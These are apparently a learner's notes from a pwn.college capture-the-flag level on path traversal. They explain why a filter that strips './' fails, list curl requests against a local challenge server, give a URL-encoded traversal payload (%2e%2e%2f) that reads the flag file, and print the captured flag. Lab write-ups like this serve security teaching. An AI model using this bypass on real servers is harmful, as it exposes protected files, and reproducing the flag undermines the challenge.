@@ -1,0 +1,39 @@
+######################################## PATH TRAVERSAL 2 ########################################
+
+ I. This challenge notes the previous level's path traversal happened because of a disconnect between:
+	--> The developer's awareness of the true range of potential input that an attacker 
+		might send to their application (e.g., the concept of an attacker sending characters 
+		that have special meaning in paths).
+	--> A gap between the developer's intent (the implementation makes it clear that we only expect
+		files under the /challenge/files directory to be served to the user) and the reality of
+		the filesystem (where paths can go "back" up a directory level).
+
+II. This level tries to stop you from traversing the path, but does it in a way that clearly
+	demonstrates a further lack of the developer's understanding of how tricky paths can truly be.
+
+ 1. Python script for server is very similar to the previous challenge
+	--> requested_path has the root path + /files/ + path.strip("./")
+	--> NOTE: ./ is the current directory!
+
+ 2. Upon running "curl -v http://challenge.localhost:80/cdn", a new message pops up
+	--> You rascal! We've secured this server. You'll have to content yourself with
+		<a href="fortunes/fortune-1.txt">a</a>
+		<a href="fortunes/fortune-2.txt">few</a>
+		<a href="fortunes/fortune-3.txt">fortunes</a>
+
+ 3. The files directory containes a new folder labeled "fortunes"
+	--> three textfiles are present - fortune-[1-3].txt
+
+ 4. The fortunes are readable by the user - each file contains a message
+	--> fortune-1.txt: You can observe a lot just by watching. -- Yogi Berra
+	--> fortune-2.txt: Haste makes waste. -- John Haywood
+	--> fortune-3.txt: TV is chewing gum for the eyes. -- Frank Lloyd Wright
+
+ 5. curl -v http://challenge.localhost:80/cdn/fortunes/fortune-1.txt showed the text within that document
+	--> maybe using the %2e%2e%2f in place of ../ will work from the fortunes directory?
+
+ 6. curl -v http://challenge.localhost:80/cdn/fortunes/%2e%2e%2f/%2e%2e%2f/%2e%2e%2f/flag shows the flag
+
+ 7. Flag for Path Traversal 2: pwn.college{Q-hJuQIs1pgMZV9qU4gkj70kVFr.QXyYTN2wyN0gTN4EzW}
+
+##################################################################################################
